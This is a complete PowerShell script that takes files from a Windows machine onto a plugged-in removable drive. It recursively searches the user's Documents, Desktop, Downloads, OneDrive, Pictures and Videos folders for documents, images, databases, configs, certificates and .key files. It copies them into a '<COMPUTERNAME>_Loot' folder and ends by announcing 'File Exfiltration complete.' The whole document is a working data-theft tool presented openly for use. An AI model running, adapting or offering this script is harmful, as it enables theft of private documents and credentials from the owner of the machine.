$removableDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }

if ($removableDrives.Length -eq 0){
    Write-Host "No Removable Drives Found.. Exiting"
    break
    }

foreach ($drive in $removableDrives) {
    $driveLetter = $drive.DeviceID

    Write-Host "Loot Drive Set To : $driveLetter/"

    $fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft")

    $foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")
    
    $destinationPath = "$driveLetter\$env:COMPUTERNAME`_Loot"

    if (-not (Test-Path -Path $destinationPath)) {
        New-Item -ItemType Directory -Path $destinationPath -Force
        Write-Host "New Folder Created : $destinationPath"
    }

    foreach ($folder in $foldersToSearch) {
        Write-Host "Searching in $folder"
        
        foreach ($extension in $fileExtensions) {
            $files = Get-ChildItem -Path $folder -Recurse -Filter $extension -File

            foreach ($file in $files) {
                $destinationFile = Join-Path -Path $destinationPath -ChildPath $file.Name
                Write-Host "Copying $($file.FullName) to $($destinationFile)"
                Copy-Item -Path $file.FullName -Destination $destinationFile -Force
            }
        }
    }

Write-Host "File Exfiltration complete."

}


